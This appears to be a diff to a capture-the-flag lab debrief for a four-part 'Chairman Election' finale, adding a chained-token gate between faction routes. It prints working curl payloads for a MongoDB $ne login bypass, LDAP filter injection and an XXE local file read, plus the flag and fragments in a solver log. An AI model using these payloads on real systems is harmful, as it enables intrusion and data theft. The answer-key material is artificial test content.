@@ -1,15 +1,23 @@
 # Chairman Election Infiltration, Debrief
 
-**Node:** `f2` &middot; **Flag:** `SEIYAKU{chairman_of_the_loopholes}` &middot; **Routes:** four faction routes + `POST /f/omnigrid/seize` &middot; **Sink:** `challenges/finals.py`, all four real backend engines used across this arc &middot; **Signal:** the Chairman seat's real key, fetched from MariaDB only once all four faction fragments independently verify
+**Node:** `f2` &middot; **Flag:** `SEIYAKU{chairman_of_the_loopholes}` &middot; **Routes:** four faction routes + `POST /f/omnigrid/seize` &middot; **Sink:** `challenges/finals.py`, all four real backend engines used across this arc &middot; **Signal:** the Chairman seat's real key, fetched from MariaDB only once all four faction fragments, breached in a chained sequence, verify together
 
 ## The shape of the finale
 
-This is the arc's closing statement: four completely independent
-systems, four completely independent bug classes, and no narrative
-pointing you at which technique any one of them wants. Each faction
-route below is deliberately built from the exact same sink shape as a
-floor you've already solved earlier in the arc, the lesson isn't a new
-vulnerability, it's recognizing a familiar shape on unfamiliar ground.
+This is the arc's closing statement: four separate systems, four
+separate bug classes, and no narrative pointing you at which technique
+any one of them wants. Each faction route below is deliberately built
+from the exact same sink shape as a floor you've already solved earlier
+in the arc, the lesson isn't a new vulnerability, it's recognizing a
+familiar shape on unfamiliar ground.
+
+The four are **chained**: only Onboarding stands open, and every faction
+after it stays sealed until the previous faction's fragment is presented
+as its `token` (validated by the same safe `_true_*_fragment()` lookups
+the seize uses). So you breach them in order, carrying each fragment
+forward to open the next, the same gate mechanic as Finals-1, applied
+across four different backends instead of one. The final seize still
+requires all four fragments at once.
 
 ```python
 # challenges/finals.py
@@ -74,10 +82,13 @@ p4_2, a JSON body with `{"$ne": null}` works identically):
 
 ```bash
 curl -s -X POST "$BASE/f/omnigrid/mobile" -H "Accept: application/json" \
+    --data-urlencode 'token=CHAIR-0NB0ARD-7f2a' \
     --data-urlencode 'username[$ne]=1' --data-urlencode 'password[$ne]=1'
 ```
 
-Recovers `CHAIR-M0B1LE-c91d` from the one seeded `omnigrid_agents`
+The `token` is faction 1's fragment, without it this faction stays
+sealed and the `$ne` bypass never runs. It recovers `CHAIR-M0B1LE-c91d`
+from the one seeded `omnigrid_agents`
 document, the exact same "reach MongoDB with an operator object instead
 of a string" bug as every earlier NoSQL floor.
 
@@ -92,7 +103,9 @@ ldap_filter = f"(&(uid={uid})(objectClass=inetOrgPerson))"
 Payload:
 
 ```bash
-curl -s -G "$BASE/f/omnigrid/directory" --data-urlencode 'uid=*)(objectClass=*'
+curl -s -G "$BASE/f/omnigrid/directory" \
+    --data-urlencode 'token=CHAIR-M0B1LE-c91d' \
+    --data-urlencode 'uid=*)(objectClass=*'
 ```
 
 Widens the filter past what any well-formed single-uid lookup could
@@ -111,6 +124,7 @@ Payload:
 
 ```bash
 curl -s -X POST "$BASE/f/omnigrid/import" \
+    --data-urlencode 'token=CHAIR-D1R3CT0RY-4e6b' \
     --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///opt/omnigrid/fragment.txt">]><request><document>&xxe;</document></request>'
 ```
 
@@ -161,11 +175,11 @@ this run):
 [f2] target: http://localhost:8000/f/omnigrid
 [f2] faction 1, Onboarding (MariaDB, error-based SQLi)
   ok: fragment = 'CHAIR-0NB0ARD-7f2a'
-[f2] faction 2, Mobile API (MongoDB, $ne auth bypass)
+[f2] faction 2, Mobile API ($ne auth bypass) — opened by faction 1's fragment
   ok: fragment = 'CHAIR-M0B1LE-c91d'
-[f2] faction 3, Directory (OpenLDAP, filter-injection dump)
+[f2] faction 3, Directory (LDAP filter injection) — opened by faction 2's fragment
   ok: fragment = 'CHAIR-D1R3CT0RY-4e6b'
-[f2] faction 4, Document Import (XXE file read)
+[f2] faction 4, Document Import (XXE file read) — opened by faction 3's fragment
   ok: fragment = 'CHAIR-D0CX7Q-9a3f'
 [f2] seizing the Chairman seat with all four fragments
   response: {'flag': 'SEIYAKU{chairman_of_the_loopholes}', 'matches': {'directory': True, 'document': True, 'mobile': True, 'onboarding': True}, 'success': True}
